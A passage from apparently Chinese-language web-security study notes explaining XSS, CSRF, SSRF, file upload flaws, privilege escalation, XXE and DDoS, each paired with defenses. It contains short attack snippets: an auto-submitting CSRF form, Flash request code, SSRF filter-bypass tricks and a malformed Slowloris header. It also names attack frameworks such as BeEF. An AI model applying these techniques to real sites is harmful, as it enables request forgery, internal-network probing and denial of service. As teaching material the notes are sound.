使用较低权限的数据库登录2. 撤销 PUBLIC 许可3. 使用存储过程4. 使用高安全性的加密技术来保护存储的敏感数据5. 维护审查跟踪</code></pre><p><strong>b 锁定数据库服务器</strong></p><p>强化数据库服务器自身安全，最低权限原则</p><pre><code>1. 额外的系统对象锁定2. 约束即席查询(ad hoc querying)3. 增强对验证周边的控制4. 在最低权限的操作系统语境中运行5. 及时更新补丁</code></pre><p><strong>C 其他防护措施</strong></p><p><strong>a 最小化不必要信息的泄露</strong></p><pre><code>1. 隐藏错误消息2. 使用空的默认Web站点3. 为DNS反向查询使用虚拟主机名称4. 使用通配符SSL证书5. 限制通过搜索引擎Hacking得到的发现6. 禁止WSDL信息</code></pre><p><strong>b 提高Web服务器日志的冗余</strong></p><p><strong>c 配置网络访问控制</strong></p><h3 id="4-语法备忘单"><a href="#4-语法备忘单" class="headerlink" title="4. 语法备忘单"></a>4. 语法备忘单</h3><p><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">websec.ca/kb/sql_injection</a>  <em>MySQL，MSSQL,ORACLE等数据库注入语法速查</em></p><hr><h2 id="0x02-XSS-攻击及防御"><a href="#0x02-XSS-攻击及防御" class="headerlink" title="0x02 XSS 攻击及防御"></a>0x02 XSS 攻击及防御</h2><h3 id="1-原理及危害"><a href="#1-原理及危害" class="headerlink" title="1. 原理及危害"></a>1. 原理及危害</h3><h4 id="1-XSS-简介"><a href="#1-XSS-简介" class="headerlink" title="(1) XSS 简介"></a>(1) XSS 简介</h4><p>跨站脚本攻击(Cross Site Scripting)，避免与层叠样式表(Cascading Style Sheets)混淆，改为XSS</p><p>一种将恶意JavaScript代码插入到其他Web用户页面里执行以达到攻击目的的漏洞；攻击者利用浏览器的动态展示功能，在HTML页面里嵌入恶意代码；当用户浏览该页面时，这些<br>嵌入的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击目的，如cookie窃取，账户劫持，拒绝服务攻击等</p><h4 id="2-产生原因"><a href="#2-产生原因" class="headerlink" title="(2) 产生原因"></a>(2) 产生原因</h4><p>未经净化的数据直接在HTML页面上展示，这些数据可能来源于http请求，数据库，Http Header，cookie等，直接导致跨站脚本威胁</p><h4 id="3-XSS-危害"><a href="#3-XSS-危害" class="headerlink" title="(3) XSS 危害"></a>(3) XSS 危害</h4><p><img src="http://pbegz2k88.bkt.clouddn.com/XSS%E5%8D%B1%E5%AE%B3.png" alt=""></p><p><em>图片参考自：绿盟科技博客</em></p><h3 id="2-XSS-分类"><a href="#2-XSS-分类" class="headerlink" title="2. XSS 分类"></a>2. XSS 分类</h3><h4 id="1-反射型XSS-Reflected-XSS"><a href="#1-反射型XSS-Reflected-XSS" class="headerlink" title="(1) 反射型XSS(Reflected XSS)"></a>(1) 反射型XSS(Reflected XSS)</h4><p>非持久性XSS，跨站代码一般存在链接中，当受害者请求此链接，跨站代码提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行</p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E5%8F%8D%E5%B0%84XSS.png" alt=""></p><h4 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="(2) 存储型XSS"></a>(2) 存储型XSS</h4><p>持久性XSS，相比反射型XSS和DOM型XSS具有更高的隐蔽性，危害更大，不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板</p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E5%AD%98%E5%82%A8XSS.png" alt=""></p><h4 id="3-DOM-XSS"><a href="#3-DOM-XSS" class="headerlink" title="(3) DOM XSS"></a>(3) DOM XSS</h4><p>一种基于DOM的跨站，由于客户端脚本自身解析不正确导致的安全问题</p><p>DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析</p><p><img src="http://pbegz2k88.bkt.clouddn.com/DOM%20XSS.png" alt=""></p><h3 id="3-发现及防御"><a href="#3-发现及防御" class="headerlink" title="3. 发现及防御"></a>3. 发现及防御</h3><h4 id="1-出现位置"><a href="#1-出现位置" class="headerlink" title="(1) 出现位置"></a>(1) 出现位置</h4><pre><code>1. 直接插入到SCRIPT标签里2. 插入到HTML注释，HTML标签属性名，HTML标签属性值3. 作为HTML标签的名字4. 直接插入到CSS里5. 所有可以提交参数并能在页面返回的位置上(URL中参数，URL自身，表单，搜索框)</code></pre><h4 id="（2）防御方案"><a href="#（2）防御方案" class="headerlink" title="（2）防御方案"></a>（2）防御方案</h4><p><img src="http://pbegz2k88.bkt.clouddn.com/XSS%E9%98%B2%E5%BE%A1.png" alt=""></p><p><em>图片来自：绿盟科技博客</em></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E9%98%B2%E5%BE%A1XSS.png" alt=""></p><p><em>参考自：《白帽子讲Web安全》</em></p><h3 id="4-XSS-参考资源"><a href="#4-XSS-参考资源" class="headerlink" title="4. XSS 参考资源"></a>4. XSS 参考资源</h3><ul><li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting" target="_blank" rel="noopener">OWQSP-XSS 预防备忘单</a></li></ul><ul><li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">OWASP-XSS攻击备忘单</a></li></ul><ul><li><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/" target="_blank" rel="noopener">那些年我们一起学XSS</a></li></ul><h3 id="5-XSS-攻击平台"><a href="#5-XSS-攻击平台" class="headerlink" title="5.XSS 攻击平台"></a>5.XSS 攻击平台</h3><p><a href="https://beefproject.com" target="_blank" rel="noopener">BeEF</a> <em>一款专注于Web浏览器的渗透框架，最好的XSS演示平台之一</em></p><p><a href="https://www.owasp.org/index.php/OWASP_XSSER" target="_blank" rel="noopener">OWASP_XSSER</a> <em>跨站点脚本框架，用于检测，利用和报告基于Web的应用程序中的XSS漏洞</em></p><p><a href="http://xss-proxy.sourceforge.net/" target="_blank" rel="noopener">XSS-Proxy</a> <em>一款轻量级XSS攻击平台，通过嵌套iframe实时远程控制被攻击的浏览器</em></p><hr><h2 id="0x03-CSRF-SSRF原理及异同"><a href="#0x03-CSRF-SSRF原理及异同" class="headerlink" title="0x03 CSRF/SSRF原理及异同"></a>0x03 CSRF/SSRF原理及异同</h2><h3 id="1-CSRF-跨站请求伪造"><a href="#1-CSRF-跨站请求伪造" class="headerlink" title="1. CSRF 跨站请求伪造"></a>1. CSRF 跨站请求伪造</h3><h4 id="1-CSRF-简述"><a href="#1-CSRF-简述" class="headerlink" title="(1) CSRF 简述"></a>(1) CSRF 简述</h4><p>CSRF，全名 <strong><em>Cross Site Request Forgery</em></strong>，跨站请求伪造。一个是“跨站点”，另一个是“伪造”。前者说明了CSRF攻击发生时所伴随的请求的来源，后者说明了该请求的产生方式。所谓伪造即该请求并不是用户本身的意愿，而是由攻击者构造，由受害者被动发出的</p><p><strong>XSS</strong>利用站点内的<strong>信任用户</strong>，而<strong>CSRF</strong>则通过<strong>伪装</strong>来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性</p><h4 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="(2) 攻击过程"></a>(2) 攻击过程</h4><p><img src="http://pbegz2k88.bkt.clouddn.com/CSRF.png" alt=""></p><p><em>图片来自：Wooyun 知识库</em></p><h4 id="3-攻击方式"><a href="#3-攻击方式" class="headerlink" title="(3) 攻击方式"></a>(3) 攻击方式</h4><p><strong>A. HTML CSRF 攻击</strong></p><p>利用HTML元素发出GET请求（带src属性的HTML标签都可以跨域发起GET请求</p><pre><code>#!html&lt;link href=&quot;…&quot;&gt;&lt;img src=&quot;…&quot;&gt;&lt;iframe src=&quot;…&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=…&quot;&gt;&lt;script src=&quot;…&quot;&gt;&lt;video src=&quot;…&quot;&gt;&lt;audio src=&quot;…&quot;&gt;&lt;a href=&quot;…&quot;&gt;&lt;table background=&quot;…&quot;&gt;…</code></pre><p>若要构造POST请求，则必须用表单提交的方式</p><pre><code>&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot;&gt;  &lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;  &lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;&lt;/form&gt;&lt;script&gt;  var f = document.getElementById(&quot;register&quot;);  f.inputs[0].value = &quot;test&quot;;  f.inputs[1].value = &quot;passwd&quot;;  f.submit();&lt;/script&gt;</code></pre><p><strong>Flash CSRF</strong></p><p>Flash 也有各种方式可以发起网络请求，包括 POST</p><pre><code>import flash.net.URLRequest;import flash.system.Security;var url = new URLRequest(&quot;http://target/page&quot;);var param = new URLVariables();param = &quot;test=123&quot;;url.method = &quot;POST&quot;;url.data = param;sendToURL(url);stop();</code></pre><p>Flash 中还可以使用 getURL、loadVars 等方式发起请求</p><pre><code>req = new LoadVars();req.addRequestHeader(&quot;foo&quot;, &quot;bar&quot;);req.send(&quot;http://target/page?v1=123&amp;v2=222&quot;, &quot;_blank&quot;, &quot;GET&quot;);</code></pre><h4 id="4-CSRF-危害"><a href="#4-CSRF-危害" class="headerlink" title="(4) CSRF 危害"></a>(4) CSRF 危害</h4><pre><code>1. 篡改目标网站上的用户数据2. 盗取用户隐私数据3. 作为其他攻击向量的辅助攻击手法4. 传播CSRF蠕虫</code></pre><h4 id="5-CSRF-防御"><a href="#5-CSRF-防御" class="headerlink" title="(5) CSRF 防御"></a>(5) CSRF 防御</h4><p><strong>A. 针对跨域</strong></p><p>CSRF攻击的请求都是跨域的，针对这一特点，可以<strong><em>在服务端对HTTP请求头部的Referer字段进行检查</em></strong>。一般情况下，用户提交的都是站内的请求，其Referer中的来源地址应该是站内的地址，而前端的JavaScript无法修改Referer字段</p><p><strong>B 针对请求伪造</strong></p><p>请求中所有参数的值都是可以预测的，如果出现了攻击者无法预测的参数值，那么将无法伪造请求，CSRF攻击也不会发生</p><ol><li>添加验证码：核心作用是区分人和机器，而CSRF攻击中的请求是在受害者上当的情况下由浏览器自动发出的，属于机器发出的请求，攻击者无法预知验证码的值，所以使用验证码可以很好地防御CSRF攻击，但会一定程度地影响用户体验</li></ol><ol start="2"><li>使用一次性token：一段字母数字随机值，当我们提交表单时，token会作为一个参数提交到服务端进行验证。在这个请求过程中，token的值也是攻击者无法预知的，而且由于同源策略的限制，攻击者也无法使用JavaScript获取其他域的token值，所以这种方法可以成功防御CSRF攻击</li></ol><p><strong>C 限制Session生命周期</strong></p><p>缩短Session的有效时间等等，可能一定程度上会降低CSRF攻击的成功率</p><h3 id="2-SSRF-服务端请求伪造"><a href="#2-SSRF-服务端请求伪造" class="headerlink" title="2. SSRF 服务端请求伪造"></a>2. SSRF 服务端请求伪造</h3><h4 id="1-SSRF-简介"><a href="#1-SSRF-简介" class="headerlink" title="(1) SSRF 简介"></a>(1) SSRF 简介</h4><p>SRF，<strong><em>Server-Side Request Forgery</em></strong>，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统</p><h4 id="2-形成原因"><a href="#2-形成原因" class="headerlink" title="(2) 形成原因"></a>(2) 形成原因</h4><p>大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等</p><h4 id="3-攻击类型"><a href="#3-攻击类型" class="headerlink" title="(3) 攻击类型"></a>(3) 攻击类型</h4><pre><code>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息2.攻击运行在内网或本地的应用程序(比如溢出)3.对内网web应用进行指纹识别，通过访问默认文件实现4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击(比如struts2，sqli等)5.利用file协议读取本地文件等</code></pre><h4 id="4-绕过方式"><a href="#4-绕过方式" class="headerlink" title="(4) 绕过方式"></a>(4) 绕过方式</h4><ol><li><p>使用@：<a href="http://A.com@10.10.10.10" target="_blank" rel="noopener">http://A.com@10.10.10.10</a></p></li><li><p>ip地址转换成进制：115.239.210.26 ＝ 16373751032</p></li><li><p>使用短地址来生成内网地址：<a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></p></li></ol><ol start="4"><li><p>端口绕过</p></li><li><p>xip.io</p></li><li><p>通过js跳转</p></li></ol><h4 id="5-防御方案"><a href="#5-防御方案" class="headerlink" title="(5) 防御方案"></a>(5) 防御方案</h4><pre><code>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态3.限制请求的端口为http常用的端口，比如，80、443、8080、80904.黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网5.禁用不需要的协议。仅仅允许http和https请求</code></pre><h3 id="3-XSS-CSRF-SSRF-异同"><a href="#3-XSS-CSRF-SSRF-异同" class="headerlink" title="3. XSS/CSRF/SSRF 异同"></a>3. XSS/CSRF/SSRF 异同</h3><p><strong><em>相同点</em></strong></p><p>XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于服务器端对用户提供的可控数据过于信任或者过滤不严导致的</p><p><strong><em>不同点</em></strong></p><p>XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行</p><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器  </p><p>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p><h3 id="4-参考资源"><a href="#4-参考资源" class="headerlink" title="4. 参考资源"></a>4. 参考资源</h3><p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF" target="_blank" rel="noopener">OWASP-Cross-Site_Request_Forgery_(CSRF)</a>)</p><p><a href="http://drops.mayter.cn/#!/drops/1189.%E9%82%AA%E6%81%B6%E7%9A%84CSRF" target="_blank" rel="noopener">Wooyun 知识库-邪恶的CSRF</a></p><p><a href="http://blog.nsfocus.net/fix-summary-csrf/" target="_blank" rel="noopener">绿盟科技博客-安全分享之CSRF</a></p><p><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="noopener">Freebuf-SSRF攻击实例解析</a></p><hr><h2 id="0x04-文件上传及防御"><a href="#0x04-文件上传及防御" class="headerlink" title="0x04 文件上传及防御"></a>0x04 文件上传及防御</h2><h3 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h3><p>使用到网站的文件上传的功能时，未对被上传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传可执行文件、脚本到服务器上，进而进一步导致服务器沦陷</p><h3 id="2-漏洞成因"><a href="#2-漏洞成因" class="headerlink" title="2. 漏洞成因"></a>2. 漏洞成因</h3><h4 id="1-服务器配置不当"><a href="#1-服务器配置不当" class="headerlink" title="(1) 服务器配置不当"></a>(1) 服务器配置不当</h4><p>当服务器配置不当时，在不需要上传页面的情况下便可导致任意文件上传，如 <strong>*HTTP PUT</strong> *方法：向指定资源位置上传其最新内容</p><h4 id="2-开源编辑器上传漏洞"><a href="#2-开源编辑器上传漏洞" class="headerlink" title="(2) 开源编辑器上传漏洞"></a>(2) 开源编辑器上传漏洞</h4><p>很多开源的编辑器历史上都有不同的上传漏洞，如 <a href="http://wiki.secbug.net/web_fck-editor.html" target="_blank" rel="noopener">CKEditor</a> 的文件上传漏洞</p><h4 id="3-本地文件上传限制被绕过"><a href="#3-本地文件上传限制被绕过" class="headerlink" title="(3) 本地文件上传限制被绕过"></a>(3) 本地文件上传限制被绕过</h4><p>只在客户端浏览器上做了文件限制而没有在远程的服务器上做限制，只需要修改数据包就可以轻松绕过限制</p><h4 id="4-过滤不严或被绕过"><a href="#4-过滤不严或被绕过" class="headerlink" title="(4) 过滤不严或被绕过"></a>(4) 过滤不严或被绕过</h4><p>有些网站上使用了黑名单过滤掉了一些关键的可执行文件脚本后缀等，但黑名单不全或者被绕过，导致可执行脚本文件被上传到服务器上，执行</p><h4 id="5-文件解析漏洞导致文件执行"><a href="#5-文件解析漏洞导致文件执行" class="headerlink" title="(5) 文件解析漏洞导致文件执行"></a>(5) 文件解析漏洞导致文件执行</h4><p>当服务器上存在 <a href="http://wiki.secbug.net/server_resolve.html" target="_blank" rel="noopener">文件解析漏洞</a> 时，合法的文件名便可导致带有恶意代码的文件被执行</p><h4 id="6-文件路径截断"><a href="#6-文件路径截断" class="headerlink" title="(6) 文件路径截断"></a>(6) 文件路径截断</h4><p>在上传的文件中使用一些特殊的符号，使得文件被上传到服务器中时路径被截断从而控制文件路径</p><h3 id="3-防御措施"><a href="#3-防御措施" class="headerlink" title="3. 防御措施"></a>3. 防御措施</h3><pre><code>1. 重新配置好服务器2. 若新版编辑器已修复漏洞，请更新编辑器版本3. 在服务器后端对上传的文件进行过滤4. 使用白名单的方法对文件进行过滤5. 使用随机数改写文件名和文件路径,不要使用用户定义的文件名和文件路径6. 被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析</code></pre><hr><h2 id="0x05-越权漏洞及防御"><a href="#0x05-越权漏洞及防御" class="headerlink" title="0x05 越权漏洞及防御"></a>0x05 越权漏洞及防御</h2><h3 id="1-定义及分类"><a href="#1-定义及分类" class="headerlink" title="1. 定义及分类"></a>1. 定义及分类</h3><h4 id="1-垂直越权漏洞"><a href="#1-垂直越权漏洞" class="headerlink" title="(1) 垂直越权漏洞"></a>(1) 垂直越权漏洞</h4><p>也称权限提升，是一种“基于URL的访问控制”设计缺陷引起的漏洞。由于Web应用程序没有做权限控制或者仅在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的</p><h4 id="2-水平越权漏洞"><a href="#2-水平越权漏洞" class="headerlink" title="(2) 水平越权漏洞"></a>(2) 水平越权漏洞</h4><p>一种“基于数据的访问控制”设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时没有判断数据的所属人而导致的越权数据访问漏洞。如服务器端从客户端提交的request参数（用户能够控制的数据）中获取用户id，恶意攻击者通过变换请求ID的值，查看或修改不属于本人的数据</p><h3 id="2-越权漏洞防护"><a href="#2-越权漏洞防护" class="headerlink" title="2. 越权漏洞防护"></a>2. 越权漏洞防护</h3><h4 id="1-垂直越权漏洞防护"><a href="#1-垂直越权漏洞防护" class="headerlink" title="(1) 垂直越权漏洞防护"></a>(1) 垂直越权漏洞防护</h4><p>在调用功能之前，验证当前用户身份是否有权限调用相关功能（推荐使用过滤器，进行统一权限验证）</p><p>通过全局过滤器来检测用户是否登录，是否对资源具有访问权限</p><h4 id="2-水平越权漏洞-1"><a href="#2-水平越权漏洞-1" class="headerlink" title="(2) 水平越权漏洞"></a>(2) 水平越权漏洞</h4><p>在用户进行操作时，从session中获取用户id，将传入的参数与用户的身份做绑定校验</p><hr><h2 id="0x06-XXE攻击及防御"><a href="#0x06-XXE攻击及防御" class="headerlink" title="0x06 XXE攻击及防御"></a>0x06 XXE攻击及防御</h2><h3 id="1-XML-简介"><a href="#1-XML-简介" class="headerlink" title="1. XML 简介"></a>1. XML 简介</h3><p>可扩展标记语言（eXtensible Markup Language，XML）是一种标记语言，被设计用来传输和存储数据，应用较为广泛</p><pre><code>* 普通列表项目文档格式：OOXML，ODF，PDF，RSS……* 图片格式：SVG，EXIF Headers……* 网络协议：WebDAV，CalDAV，XMLRPC，SOAP，REST，XMPP，SAML，XACML……* 配置文件：Spring配置文件，Struts2配置文件……</code></pre><p>在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明</p><h3 id="2-XXE-攻击"><a href="#2-XXE-攻击" class="headerlink" title="2. XXE 攻击"></a>2. XXE 攻击</h3><p>XML外部实体（XML External Entity，XXE）攻击是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据</p><h3 id="3-XXE-成因"><a href="#3-XXE-成因" class="headerlink" title="3. XXE 成因"></a>3. XXE 成因</h3><p>XML解析器解析外部实体时支持多种协议</p><p><img src="http://pbegz2k88.bkt.clouddn.com/XXE%E5%8D%8F%E8%AE%AE.png" alt=""></p><p>如使用file协议可以读取本地文件内容、使用http协议可以获取Web资源等，因此攻击者可构造恶意的外部实体，当解析器解析了包含“恶意”外部实体的XML类型文件时，便会导致被XXE攻击</p><h3 id="4-攻击方式"><a href="#4-攻击方式" class="headerlink" title="4. 攻击方式"></a>4. 攻击方式</h3><h4 id="A-显示攻击"><a href="#A-显示攻击" class="headerlink" title="A. 显示攻击"></a>A. 显示攻击</h4><p>攻击者通过正常的回显将外部实体里的内容读取出来</p><h4 id="B-盲攻击"><a href="#B-盲攻击" class="headerlink" title="B. 盲攻击"></a>B. 盲攻击</h4><p>利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache日志）中读出文件的内容</p><h3 id="5-XXE-危害"><a href="#5-XXE-危害" class="headerlink" title="5. XXE 危害"></a>5. XXE 危害</h3><p>(1) 读取任意文件</p><p>(2) 执行系统命令</p><p>(3) 探测内网端口</p><p>(4) 攻击内网网站</p><h3 id="6-XXE-防御"><a href="#6-XXE-防御" class="headerlink" title="6. XXE 防御"></a>6. XXE 防御</h3><p>(1) 使用开发语言提供的禁用外部实体的方法</p><p>(2) 过滤用户提交的XML数据</p><p>(3) 在默认情况下关闭内联DTD解析（Inline DTD parsing）、外部实体、实体，使用白名单来控制允许实用的协议</p><h3 id="7-参考资源"><a href="#7-参考资源" class="headerlink" title="7. 参考资源"></a>7. 参考资源</h3><p><a href="https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf" target="_blank" rel="noopener">OWASP-XML_Exteral_Entity_Attack</a></p><p><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="noopener">OWASP- XXE预防备忘单</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a></p><hr><h2 id="0x07-DDoS攻击与防御"><a href="#0x07-DDoS攻击与防御" class="headerlink" title="0x07 DDoS攻击与防御"></a>0x07 DDoS攻击与防御</h2><h3 id="1-DDoS简介"><a href="#1-DDoS简介" class="headerlink" title="1. DDoS简介"></a>1. DDoS简介</h3><p>全称Distributed Denial of Service，分布式拒绝服务，利用DDoS造成的攻击称为拒绝服务攻击，其原理就是利用大量的请求造成资源过载，导致服务不可用。<br>　　<br>DDoS攻击从层次上可分为<strong><em>网络层</em></strong>攻击与<strong><em>应用层</em></strong>攻击，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用</p><h3 id="2-网络层DDoS攻击"><a href="#2-网络层DDoS攻击" class="headerlink" title="2. 网络层DDoS攻击"></a>2. 网络层DDoS攻击</h3><p>网络层DDos攻击包括<strong><em>SYN flood、UDP flood、ICMP flood</em></strong>等</p><h4 id="1-SYN-flood攻击"><a href="#1-SYN-flood攻击" class="headerlink" title="(1) SYN flood攻击"></a><strong>(1) SYN flood攻击</strong></h4><p>SYN flood攻击主要利用了TCP三次握手过程中的缺陷，我们知道TCP三次握手过程是要建立连接的双方发送SYN，SYN+ACK，ACK数据包，而当攻击方随意构造源ip去发送SYN包时，服务器返回的SYN+ACK就不能得到应答（因为ip是随意构造的），此时服务器就会尝试重新发送，并且会有至少30s的等待时间，导致资源饱和服务不可用，此攻击属于<strong><em>慢型dos攻击</em></strong></p><h4 id="2-UDP-flood攻击"><a href="#2-UDP-flood攻击" class="headerlink" title="(2) UDP flood攻击 "></a><strong>(2) UDP flood攻击 </strong></h4><p>udp是一种无连接的协议，因此攻击者可以伪造大量的源IP地址去发送udp包，此种攻击属于<strong><em>大流量攻击</em></strong>。正常应用情况下，UDP包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源</p><h4 id="3-ICMP-flood攻击"><a href="#3-ICMP-flood攻击" class="headerlink" title="(3) ICMP flood攻击"></a><strong>(3) ICMP flood攻击</strong></h4><p>此攻击属于<strong><em>大流量攻击</em></strong>，其原理就是不断发送不正常的ICMP包（所谓不正常就是ICMP包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。并且目前很多服务器都是禁ping的（在防火墙在可以屏蔽icmp包）</p><h3 id="3-网络层DDoS防御"><a href="#3-网络层DDoS防御" class="headerlink" title="3. 网络层DDoS防御"></a>3. 网络层DDoS防御</h3><p>(1) 网络架构上做好优化，提升带宽，采用负载均衡分流</p><p>(2) 添加抗DDos设备，流量清洗</p><p>(3) 限制单ip请求频率</p><p>(4) 防火墙等防护设置禁止icmp包等</p><h3 id="4-应用层DDoS攻击"><a href="#4-应用层DDoS攻击" class="headerlink" title="4. 应用层DDoS攻击"></a>4. 应用层DDoS攻击</h3><p>应用层DDoS攻击不同于网络层DDoS，发生在TCP建立握手成功之后，应用程序处理请求的时候</p><h4 id="1-CC-攻击"><a href="#1-CC-攻击" class="headerlink" title="(1) CC 攻击"></a><strong>(1) CC 攻击</strong></h4><p>“CC攻击”的前身是一个叫fatboy的攻击程序，当时绿盟为了防御DDos攻击研发了一款产品，叫做“Collapasar”，能够有效的防御SYN flood攻击。而黑客为了挑衅，研发了一款Challenge Collapasar工具（简称CC），意指在黑洞的防御下，仍能有效完成拒绝服务攻击</p><p>CC攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送CC攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过cc攻击，使用爬虫对某些加载需要消耗大量资源的页面发起http请求</p><h4 id="2-Slowlories-攻击"><a href="#2-Slowlories-攻击" class="headerlink" title="(2) Slowlories 攻击"></a><strong>(2) Slowlories 攻击</strong></h4><p>由于webserver中间件漏洞引发的拒绝服务攻击，其原理是以极低的速度往服务器发送HTTP请求。apache等中间件默认会设置最大并发链接数，而这种攻击就是会持续保持连接，导致服务饱和不可用。slowloris有点类似基于HTTP协议的SYN flood攻击</p><p><strong><em>构造畸形http请求包</em></strong></p><pre><code>GET / HTTP/1.1\r\nHost: Victim host\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n</code></pre><p>完整的http请求头结尾应该是两次的\r\n\r\n，这里少了一次，因此服务器将会一直等待</p><h4 id="3-HTTP-POST-DOS"><a href="#3-HTTP-POST-DOS" class="headerlink" title="(3) HTTP POST DOS"></a><strong>(3) HTTP POST DOS</strong></h4><p>原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以极低的速度发包，保持连接不断，导致服务饱和不可用</p><h4 id="4-Slow-Read-attack"><a href="#4-Slow-Read-attack" class="headerlink" title="(4) Slow Read attack"></a><strong>(4) Slow Read attack</strong></h4><p>Slow Read attack攻击方式是采用调整TCP协议中的滑动窗口大小，来对服务器单次发送发送的数据大小进行控制，使得服务器需要对一个回应分成很多个包来发送</p><h4 id="5-Server-Limit-Dos"><a href="#5-Server-Limit-Dos" class="headerlink" title="(5) Server Limit Dos"></a><strong>(5) Server Limit Dos</strong></h4><p>这是由于cookie导致的dos攻击，当然其原理还是基于webserver的特性。apache默认最大的http包头长度为8192字节，如果超出此长度，则会返回4xx错误。如果我们利用存储型xss漏洞，将一个超长的cookie写入客户端页面，则用户再访问此页面后，由于请求头加载了恶意的超长cookie，导致其不能访问该站的页面（除非清空cookie）</p><h4 id="6-ReDos"><a href="#6-ReDos" class="headerlink" title="(6) ReDos"></a><strong>(6) ReDos</strong></h4><p>这是由于代码写得有缺陷，导致使用正则时，会出现大量占用资源的情况，导致服务不可用，这是利用了正则表达式在匹配时的某些特性决定的</p><h3 id="5-应用层DDoS防御"><a href="#5-应用层DDoS防御" class="headerlink" title="5. 应用层DDoS防御"></a>5. 应用层DDoS防御</h3><p>(1) 判断User-Agent字段（不可靠，因为可以随意构造）</p><p>(2) 网页中镶嵌js代码（不可靠，因为爬虫也可携带浏览器引擎，或者执行js代码）</p><p>(3) 针对ip+cookie，限制访问频率（由于cookie可以更改，ip可以使用代理，或者肉鸡，也不可靠)</p><p>(4) 关闭apache最大连接数等，合理配置中间件，缓解ddos攻击</p><p>(5)页面中添加验证码，比如搜索数据库时</p><p>(6) 编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作</p><p>应用层的防御有时比网络层的更难，因为导致应用层被dos攻击的因素非常多，有时往往是因为程序员的失误，导致某个页面加载需要消耗大量资源，有时是因为中间件配置不当等等。而应用层DDos防御的核心就是区分人与机器（爬虫），因为大量的请求不可能是人为的，肯定是机器构造的。因此如果能有效的区分人与爬虫行为，则可以很好地防御此攻击</p><hr><p>0xFF 参考及学习资源</p><ul><li><p><a href="https://www.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf" target="_blank" rel="noopener">OWAP Top-10 </a></p></li><li><p><a href="http://drops.mayter.cn/#!/" target="_blank" rel="noopener">WooYun知识库</a></p></li></ul><ul><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/introduction/" target="_blank" 